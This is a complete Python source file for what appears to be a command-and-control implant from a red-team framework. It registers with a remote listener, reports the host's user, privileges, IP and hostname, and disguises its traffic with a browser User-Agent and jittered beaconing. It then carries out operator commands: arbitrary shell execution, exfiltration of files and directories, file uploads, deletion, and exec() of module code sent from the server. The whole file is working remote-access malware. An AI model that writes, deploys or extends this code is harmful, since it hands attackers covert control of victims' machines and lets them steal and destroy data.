import ctypes
import email
import getpass
import json
import locale
import logging  # DEBUG
import os
import platform
import random
import shutil
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request
import uuid
import zlib
from email import policy

REMOTE_HOST = "127.0.0.1"
REMOTE_PORT = 1337
SLEEP_TIME = 1.0
SLEEP_TIME_JITTER = 0.5
TASKS_URL_PATHS = ["/tasks"]
RESULTS_URL_PATHS = ["/results"]
REGISTRATION_URL_PATHS = ["/register"]
EXTRA_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0)"}
AGENT_TYPE = "eula_multi"


def ping_capability(context):
    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
    )
    for _ in range(context.arguments["iterations"]):
        ping = context.connection.get_task_input_message_from_listener()
        try:
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=True,
                data={"sequence": ping.data["sequence"]},
            )
        except urllib.error.HTTPError:
            continue


def sleep_capability(context):
    duration = context.arguments["duration"]
    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        message=f"Agent is sleeping for {duration} seconds...",
    )
    time.sleep(duration)


def disconnect_capability(context):
    duration = context.arguments["duration"]
    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        message=(
            f"Agent is disconnecting and waiting {duration} second(s) "
            "before attempting to reconnect..."
        ),
    )
    time.sleep(duration)
    return True  # Signal to disconnect


def kill_capability(context):
    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        message="Agent is killing itself...",
    )
    exit()


def delay_capability(context):
    duration = context.arguments["duration"]
    jitter = context.arguments["jitter"]
    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        message=(
            f"Agent is updating delay to '{duration}' second(s) with a "
            f"jitter of '{jitter}'"
        ),
    )
    context.connection.sleep_time = duration
    context.connection.sleep_time_jitter = jitter


def shell_capability(context):
    command = context.arguments["command"]
    timeout = context.arguments["timeout"]
    blind = context.arguments["blind"]
    shell = context.arguments["shell"]
    expand = context.arguments["expand"]

    if shell and not os.path.exists(shell):
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=(
                f"Failed to execute command '{command}'. The provided shell binary "
                "file path does not exist."
            ),
        )
        return

    if command[:3].lstrip().lower() == "cd ":
        directory_to_change_to = command.replace("cd ", "", 1)
        if expand:
            directory_to_change_to = os.path.expandvars(directory_to_change_to)
        try:
            os.chdir(directory_to_change_to)
        except FileNotFoundError:
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=False,
                message=(
                    f"Failed to change to directory '{directory_to_change_to}'. "
                    "Directory does not exist."
                ),
            )
            return
        except NotADirectoryError:
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=False,
                message=(
                    f"Failed to change to directory '{directory_to_change_to}'. Path "
                    "is not a directory."
                ),
            )
            return
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=True,
            message=f"Changed to directory '{directory_to_change_to}'",
        )
        return

    if platform.system() == "Windows" and shell is None:
        if os.path.exists(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        ):
            shell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        else:
            shell = "C:\\Windows\\System32\\cmd.exe"

    if blind:
        subprocess.Popen(
            command,
            shell=True,
            executable=shell,
        )
        output = f"Executed command '{command}' blind."
    else:
        try:
            output = subprocess.run(  # noqa: UP022
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
                executable=shell,
            )
        except subprocess.TimeoutExpired:
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=False,
                message=(
                    f"Failed to execute command '{command}'. Command timed out "
                    f"after {timeout} second(s)."
                ),
            )
            return

        output = (output.stdout + output.stderr).decode("utf-8", errors="ignore")

    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        message=output,
    )


def download_capability(context):
    source = context.arguments["source"]
    recursive = context.arguments["recursive"]
    chunk_size = context.arguments["chunk_size"]
    ignore_empty_dirs = context.arguments["ignore_empty_dirs"]
    compression_level = context.arguments["compression_level"]
    expand = context.arguments["expand"]

    if expand:
        source = os.path.expandvars(source)

    if not os.path.exists(source):
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=f"Failed to start download. Path '{source}' does not exist.",
        )
        return

    def send_file(file_path, relative_path=None):
        try:
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=True,
                data={
                    "type": "file",
                    # Exclude the base dir within the relative path
                    "path": relative_path
                    if relative_path
                    else os.path.basename(file_path),
                    "size": os.path.getsize(file_path),
                },
            )
            with open(file_path, mode="rb") as file:
                while True:
                    chunk = file.read(chunk_size)
                    if not chunk:
                        break
                    if compression_level:
                        chunk = zlib.compress(chunk, level=compression_level)
                    context.connection.post_task_message_to_listener(
                        task_id=context.task_id,
                        success=True,
                        data={
                            "type": "chunk",
                        },
                        payload=chunk,
                    )
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=True,
                data={
                    "type": "end_of_file",
                },
            )
        except PermissionError:
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=False,
                message=f"Permission denied reading file '{file_path}'.",
            )

    def send_directory(directory_path):
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=True,
            data={"type": "directory", "path": os.path.basename(directory_path)},
        )
        for root, dirs, files in os.walk(directory_path):
            for directory in dirs:
                dir_path = os.path.join(root, directory)
                if ignore_empty_dirs and not os.listdir(dir_path):
                    continue
                context.connection.post_task_message_to_listener(
                    task_id=context.task_id,
                    success=True,
                    data={
                        "type": "directory",
                        # Exclude the base dir within the relative path
                        "path": os.path.relpath(dir_path),
                    },
                )
            for file in files:
                file_path = os.path.join(root, file)
                relative_path = os.path.relpath(file_path, directory_path)
                send_file(file_path=file_path, relative_path=relative_path)
            if not recursive:
                break

    if os.path.isfile(source):
        send_file(file_path=source)
    else:
        send_directory(directory_path=source)

    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        data={"type": "end_of_transfer"},
    )


def upload_capability(context):
    destination = context.arguments["destination"]
    expand = context.arguments["expand"]
    overwrite = context.arguments["overwrite"]

    if expand:
        destination = os.path.expandvars(destination)

    if os.path.exists(destination) and not overwrite:
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=f"Failed to start upload. Path '{destination}' already exists.",
        )
        return

    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
    )

    header = context.connection.get_task_input_message_from_listener()

    is_dir = header.data["type"] == "directory"
    current_file_handle = None

    # Ensure root destination exists if it's meant to be a directory upload
    if is_dir:
        os.makedirs(destination, exist_ok=True)

    while True:
        response = context.connection.get_task_input_message_from_listener()

        msg_type = response.data.get("type")

        if msg_type == "file":
            if current_file_handle:
                current_file_handle.close()

            relative_path = response.data["path"]

            if is_dir:
                # Uploading a directory: reconstruct path
                current_file_path = os.path.join(destination, relative_path)
            else:
                # Uploading a single file: check if destination is meant to be a folder
                if os.path.isdir(destination):
                    current_file_path = os.path.join(destination, relative_path)
                else:
                    current_file_path = destination

            # Ensure the parent directory for the incoming file exists
            parent_dir = os.path.dirname(current_file_path)
            if parent_dir:
                os.makedirs(parent_dir, exist_ok=True)

            try:
                current_file_handle = open(current_file_path, "wb")
            except PermissionError:
                context.connection.post_task_message_to_listener(
                    task_id=context.task_id,
                    success=False,
                    message=f"Permission denied writing to '{current_file_path}'.",
                )
                return
        elif msg_type == "chunk":
            try:
                # Decode and write the chunk
                chunk = zlib.decompress(response.payload)
                if current_file_handle:
                    current_file_handle.write(chunk)
            except zlib.error as exc:
                context.connection.post_task_message_to_listener(
                    task_id=context.task_id,
                    success=False,
                    message=f"Failed to decompress file chunk: {exc}",
                )
                if current_file_handle:
                    current_file_handle.close()
                return
        elif msg_type == "directory":
            # Reconstruct and create empty/nested directories
            dir_path = os.path.join(destination, response.data["path"])
            os.makedirs(dir_path, exist_ok=True)
        elif msg_type == "end_of_file":
            if current_file_handle:
                current_file_handle.close()
                current_file_handle = None
        elif msg_type == "end_of_transfer":
            if current_file_handle:
                current_file_handle.close()
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=True,
            )
            break
        else:
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=False,
                message=f"Unknown message type received during upload: {msg_type}",
            )
            break


def open_capability(context):
    path = context.arguments["path"]
    if sys.platform == "win32":
        try:
            os.startfile(path)
        except OSError as exc:
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=False,
                message=f"Failed to open file '{path}': {exc}",
            )
    else:
        cmd = ["open", path] if sys.platform == "darwin" else ["xdg-open", path]
        try:
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except FileNotFoundError as e:
            context.connection.post_task_message_to_listener(
                task_id=context.task_id,
                success=False,
                message=f"Failed to open file '{path}': {e}",
            )


def cd_capability(context):
    path = context.arguments["path"]
    if context.arguments["expand"]:
        path = os.path.expandvars(path)

    try:
        os.chdir(path)
    except (FileNotFoundError, NotADirectoryError, PermissionError) as exc:
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=f"Failed to change directory to '{path}'. {exc}",
        )
        return

    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        message=f"Changed directory to: {path}",
    )


def pwd_capability(context):
    try:
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=True,
            message=os.getcwd(),
        )
    except FileNotFoundError as exc:
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=f"Failed to get current working directory. {exc}",
        )


def ls_capability(context):
    path = context.arguments["path"]
    expand = context.arguments["expand"]

    if expand:
        path = os.path.expandvars(path)

    try:
        entries = os.listdir(path)
    except (FileNotFoundError, PermissionError, NotADirectoryError) as exc:
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=f"Failed to list directory for '{path}'. {exc}",
        )
        return

    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        message=f"Contents of directory '{path}': {entries}",
    )


def cat_capability(context):
    path = context.arguments["path"]

    try:
        with open(path) as file:
            content = file.read()
    except (
        FileNotFoundError,
        PermissionError,
        UnicodeDecodeError,
        IsADirectoryError,
    ) as exc:
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=f"Failed to read file '{path}'. {exc}.",
        )
        return

    context.connection.post_task_message_to_listener(
        task_id=context.task_id, success=True, message=content
    )


def rm_capability(context):
    path = context.arguments["path"]
    recursive = context.arguments["recursive"]
    expand = context.arguments["expand"]

    if expand:
        path = os.path.expandvars(path)

    try:
        if os.path.isdir(path):
            if recursive:
                shutil.rmtree(path)
            else:
                os.rmdir(path)
        else:
            os.remove(path)
    except (
        FileNotFoundError,
        NotADirectoryError,
        IsADirectoryError,
        PermissionError,
        OSError,
    ) as exc:
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=f"Failed to remove '{path}'. {exc}.",
        )
        return

    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        message=f"Successfully removed '{path}'.",
    )


def mv_capability(context):
    source = context.arguments["source"]
    destination = context.arguments["destination"]
    expand = context.arguments["expand"]

    if expand:
        source = os.path.expandvars(source)
        destination = os.path.expandvars(destination)

    try:
        shutil.move(source, destination)
    except (
        FileNotFoundError,
        NotADirectoryError,
        IsADirectoryError,
        PermissionError,
        shutil.Error,
    ) as exc:
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=f"Failed to move '{source}' to '{destination}'. {exc}.",
        )
        return

    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        message=f"Successfully moved '{source}' to '{destination}'.",
    )


def cp_capability(context):
    source = context.arguments["source"]
    destination = context.arguments["destination"]
    recursive = context.arguments["recursive"]
    expand = context.arguments["expand"]
    overwrite = context.arguments["overwrite"]

    if expand:
        source = os.path.expandvars(source)
        destination = os.path.expandvars(destination)

    if os.path.exists(destination) and not overwrite:
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=(
                f"Failed to copy '{source}' to '{destination}'. Destination path "
                f"already exists and overwrite option is not set."
            ),
        )
        return

    try:
        if os.path.isdir(source):
            if recursive:
                if os.path.exists(destination):
                    shutil.rmtree(destination)
                shutil.copytree(source, destination)
            else:
                context.connection.post_task_message_to_listener(
                    task_id=context.task_id,
                    success=False,
                    message=(
                        f"Failed to copy '{source}' to '{destination}'. Source path to "
                        "be copied is a directory but the recursive option was not "
                        "set."
                    ),
                )
                return
        else:
            shutil.copy2(source, destination)
    except (FileNotFoundError, PermissionError) as exc:
        context.connection.post_task_message_to_listener(
            task_id=context.task_id,
            success=False,
            message=f"Failed to copy '{source}' to '{destination}'. {exc}",
        )
        return

    context.connection.post_task_message_to_listener(
        task_id=context.task_id,
        success=True,
        message=f"Copied '{source}' to '{destination}'.",
    )


def sleep_random(sleep_time, sleep_time_jitter):
    jitter_range = sleep_time * sleep_time_jitter
    random_jitter = random.uniform(-jitter_range, jitter_range)
    time_to_sleep = sleep_time + random_jitter
    if time_to_sleep < 0:
        time_to_sleep = 0
    time.sleep(time_to_sleep)


class TaskLaunchMessage:
    def __init__(self, task_id, command, arguments, data, payload):
        self.task_id = task_id
        self.command = command
        self.arguments = arguments
        self.data = data
        self.payload = payload


class TaskInputMessage:
    def __init__(self, task_id, data, payload):
        self.task_id = task_id
        self.data = data
        self.payload = payload


class CapabilityContext:
    def __init__(self, task_launch_message, connection):
        self.task_id = task_launch_message.task_id
        self.command = task_launch_message.command
        self.arguments = task_launch_message.arguments
        self.data = task_launch_message.data
        self.connection = connection


class ModuleLoader:
    def __init__(self):
        self._loaded_modules = {}

    def load_module(self, module_name, module_source_code):
        if module_name in self._loaded_modules:
            return {
                "success": False,
                "message": (
                    f"Failed to load module. Module '{module_name}' is already loaded."
                ),
                "data": {},
            }

        try:
            module_namespace = {}
            exec(module_source_code, module_namespace)
        except Exception as exc:
            return {
                "success": False,
                "message": f"Failed to load module. {exc}",
                "data": {},
            }

        try:
            self._loaded_modules[module_name] = module_namespace["Module"]()
        except KeyError:
            return {
                "success": False,
                "message": "Failed to load module. Module class not found in module",
                "data": {},
            }

        return {
            "success": True,
            "message": f"Loaded module '{module_name}'.",
            "data": {},
        }

    def unload_module(self, module_name: str):
        if module_name in self._loaded_modules:
            del self._loaded_modules[module_name]
            return {
                "success": True,
                "message": f"Unloaded module '{module_name}'.",
                "data": {},
            }
        else:
            return {
                "success": False,
                "message": (
                    f"Failed to unload module. Module '{module_name}' is not currently "
                    "loaded."
                ),
                "data": {},
            }

    def reload_module(self, module_name, module_source_code):
        if module_name not in self._loaded_modules:
            return {
                "success": False,
                "message": (
                    f"Failed to reload module. Module '{module_name}' is not currently "
                    "loaded."
                ),
                "data": {},
            }

        try:
            module_namespace = {}
            exec(module_source_code, module_namespace)
        except Exception as exc:
            return {
                "success": False,
                "message": f"Failed to reload module. {exc}",
                "data": {},
            }

        try:
            self._loaded_modules[module_name] = module_namespace["Module"]()
        except KeyError:
            return {
                "success": False,
                "message": "Failed to reload module. Module class not found in module",
                "data": {},
            }

        return {
            "success": True,
            "message": f"Reloaded module '{module_name}'.",
            "data": {},
        }

    def run_module(self, module_name, context):
        self._loaded_modules[module_name].run_module(context=context)

    def get_loaded_module_names(self):
        return list(self._loaded_modules.keys())


class Connection:
    def __init__(
        self,
        remote_host,
        remote_port,
        sleep_time,
        sleep_time_jitter,
        tasks_url_paths,
        results_url_paths,
        registration_url_paths,
    ):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.sleep_time = sleep_time
        self.sleep_time_jitter = sleep_time_jitter
        self.tasks_url_paths = tasks_url_paths
        self.results_url_paths = results_url_paths
        self.registration_url_paths = registration_url_paths

        self._listener_base_url = f"http://{self.remote_host}:{self.remote_port}"
        self._agent_id = None

    def register_with_listener(self, agent_data):
        register_request = urllib.request.Request(
            f"{self._listener_base_url}{random.choice(self.registration_url_paths)}",
            data=json.dumps(agent_data).encode(),
            method="POST",
            headers=EXTRA_HEADERS,
        )
        agent_id_response = urllib.request.urlopen(register_request)
        agent_id = json.loads(agent_id_response.read().decode())["agent_id"]
        self._agent_id = agent_id
        return agent_id

    def _get_task_message_from_listener(self):
        if self._agent_id is None:
            raise RuntimeError("Agent not registered with listener")

        get_task_message_request = urllib.request.Request(
            f"{self._listener_base_url}{random.choice(self.tasks_url_paths)}",
            headers={"Cookie": self._agent_id, **EXTRA_HEADERS},
        )
        while True:
            with urllib.request.urlopen(get_task_message_request) as resp:
                if resp.status != 200:
                    sleep_random(self.sleep_time, self.sleep_time_jitter)
                    continue

                body = resp.read()
                content_type = (
                    resp.headers.get_content_type()
                )  # 'application/json' or 'multipart/mixed'

                if content_type == "application/json":
                    task_message_json = json.loads(body)
                    payload = None
                elif content_type.startswith("multipart/"):
                    # body alone has no headers, so prepend the Content-Type line
                    # (with boundary) that the email parser needs to split parts
                    header = (
                        f"Content-Type: {resp.headers['Content-Type']}\r\n\r\n".encode(
                            "ascii"
                        )
                    )
                    msg = email.message_from_bytes(header + body, policy=policy.default)

                    task_message_json = None
                    payload = None
                    for part in msg.iter_parts():
                        name = part.get_param("name", header="Content-Disposition")
                        if name == "json":
                            task_message_json = json.loads(
                                part.get_payload(decode=True)
                            )
                        elif name == "payload":
                            payload = part.get_payload(decode=True)
                        else:
                            raise RuntimeError(f"Unexpected part name: {name}")
                else:
                    raise ValueError(f"Unexpected content type: {content_type}")

            logging.debug(f"GET {task_message_json}", task_message_json)  # DEBUG
            if "command" in task_message_json and "arguments" in task_message_json:
                return TaskLaunchMessage(
                    task_message_json["task_id"],
                    task_message_json["command"],
                    task_message_json["arguments"],
                    task_message_json["data"],
                    payload,
                )

            return TaskInputMessage(
                task_message_json["task_id"],
                task_message_json["data"],
                payload,
            )

    def get_task_message_from_listener(self):
        return self._get_task_message_from_listener()

    def get_task_launch_message_from_listener(self):
        task_message = self._get_task_message_from_listener()
        if not isinstance(task_message, TaskLaunchMessage):
            raise TypeError(
                f"Expected TaskLaunchMessage but received {type(task_message).__name__}"
            )
        return task_message

    def get_task_input_message_from_listener(self):
        task_message = self._get_task_message_from_listener()
        if not isinstance(task_message, TaskInputMessage):
            raise TypeError(
                f"Expected TaskInputMessage but received {type(task_message).__name__}"
            )
        return task_message

    def post_task_message_to_listener(
        self, task_id, success, message="", data=None, payload=None
    ):
        if data is None:
            data = {}
        if self._agent_id is None:
            raise RuntimeError("Agent not registered with listener")

        task_output_message_json = {
            "task_id": task_id,
            "success": success,
            "message": message,
            "data": data,
        }

        if payload is not None:
            # Generate a unique boundary
            boundary = str(uuid.uuid4())

            # Define the Content-Type header
            headers = {
                **EXTRA_HEADERS,
                "Cookie": self._agent_id,
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            }

            # Construct the body as bytes
            body = []

            # JSON Metadata
            body.append(f"--{boundary}".encode())
            body.append(b'Content-Disposition: form-data; name="json"')
            body.append(b"Content-Type: application/json")
            body.append(b"")  # Blank line before data
            body.append(json.dumps(task_output_message_json).encode("utf-8"))

            # Binary Data
            body.append(f"--{boundary}".encode())
            body.append(b'Content-Disposition: form-data; name="payload"')
            body.append(b"Content-Type: application/octet-stream")
            body.append(b"")  # Blank line before data
            body.append(payload)

            # Close the request
            body.append(f"--{boundary}--".encode())
            body.append(b"")

            # Join all parts with CRLF
            data = b"\r\n".join(body)
        else:
            data = json.dumps(task_output_message_json).encode()
            headers = {
                **EXTRA_HEADERS,
                "Cookie": self._agent_id,
                "Content-Type": "application/json",
            }

        urllib.request.urlopen(
            urllib.request.Request(
                f"{self._listener_base_url}{random.choice(self.results_url_paths)}",
                data=data,
                headers=headers,
                method="POST",
            )
        )
        logging.debug(  # DEBUG
            f"POST {task_output_message_json} {len(payload) if payload else 0} "  # DEBUG
            "payload byte(s)"  # DEBUG
        )  # DEBUG


class Agent:
    def __init__(
        self,
        connection,
        module_loader,
    ):
        self.connection = connection
        self.module_loader = module_loader
        self.capability_dispatch = {
            "sleep": sleep_capability,
            "delay": delay_capability,
            "kill": kill_capability,
            "ping": ping_capability,
            "shell": shell_capability,
            "download": download_capability,
            "upload": upload_capability,
            "open": open_capability,
            "cd": cd_capability,
            "ls": ls_capability,
            "pwd": pwd_capability,
            "cat": cat_capability,
            "cp": cp_capability,
            "rm": rm_capability,
            "mv": mv_capability,
        }

    def _sleep(self):
        sleep_random(self.connection.sleep_time, self.connection.sleep_time_jitter)

    def run_agent(self):
        def get_is_admin():
            try:
                return os.getuid() == 0
            except AttributeError:
                try:
                    return ctypes.windll.shell32.IsUserAnAdmin() != 0
                except Exception:
                    return False

        def get_local_ip():
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            test_socket.settimeout(0)
            try:
                test_socket.connect(("10.254.254.254", 1))
                local_ip = test_socket.getsockname()[0]
            except Exception:
                local_ip = "127.0.0.1"
            finally:
                test_socket.close()
            return local_ip

        def get_user():
            try:
                return getpass.getuser()
            except Exception:
                return None

        agent_data_querying_functions = {
            "agent_type": lambda: AGENT_TYPE,
            "user": get_user,
            "is_admin": get_is_admin,
            "os": lambda: platform.system() + " " + platform.release(),
            "version": platform.version,
            "arch": platform.machine,
            "pid": os.getpid,
            "locale": lambda: " ".join(str(x) for x in locale.getlocale()),
            "local_ip": get_local_ip,
            "hostname": platform.node,
        }
        agent_data = {}
        for data_name, data_function in agent_data_querying_functions.items():
            try:
                agent_data[data_name] = data_function()
            except Exception as exc:
                logging.error(exc, exc_info=exc)  # DEBUG
                pass

        while True:
            try:
                while True:
                    try:
                        self.connection.register_with_listener(agent_data=agent_data)
                        break
                    except urllib.error.URLError:
                        self._sleep()

                while True:
                    task_launch_message = (
                        self.connection.get_task_launch_message_from_listener()
                    )
                    disconnect = False
                    command = task_launch_message.command
                    capability_context = CapabilityContext(
                        task_launch_message=task_launch_message,
                        connection=self.connection,
                    )

                    if command in self.capability_dispatch:
                        self.capability_dispatch[command](capability_context)
                    elif command == "disconnect":
                        disconnect = disconnect_capability(capability_context)
                        if disconnect:
                            break
                    else:
                        try:
                            self.module_loader.run_module(
                                module_name=command,
                                context=capability_context,
                            )
                        except urllib.error.URLError:
                            raise
                        except Exception as exc:
                            logging.error(exc, exc_info=exc)  # DEBUG
                            self.connection.post_task_message_to_listener(
                                task_id=capability_context.task_id,
                                success=False,
                                message=(
                                    f"Failed to run command '{command}'. "
                                    f"{exc.__class__.__name__}: {exc}"
                                ),
                                data={
                                    "type": exc.__class__.__name__,
                                    "message": str(exc),
                                },
                            )
                    if disconnect:
                        break
                    self._sleep()
            except Exception as exc:
                logging.error(exc, exc_info=exc)  # DEBUG
                self._sleep()


def main():
    logging.basicConfig(level=logging.DEBUG)  # DEBUG
    connection = Connection(
        remote_host=REMOTE_HOST,
        remote_port=REMOTE_PORT,
        sleep_time=SLEEP_TIME,
        sleep_time_jitter=SLEEP_TIME_JITTER,
        tasks_url_paths=TASKS_URL_PATHS,
        results_url_paths=RESULTS_URL_PATHS,
        registration_url_paths=REGISTRATION_URL_PATHS,
    )
    module_loader = ModuleLoader()
    agent = Agent(connection=connection, module_loader=module_loader)
    agent.run_agent()


if __name__ == "__main__":
    main()
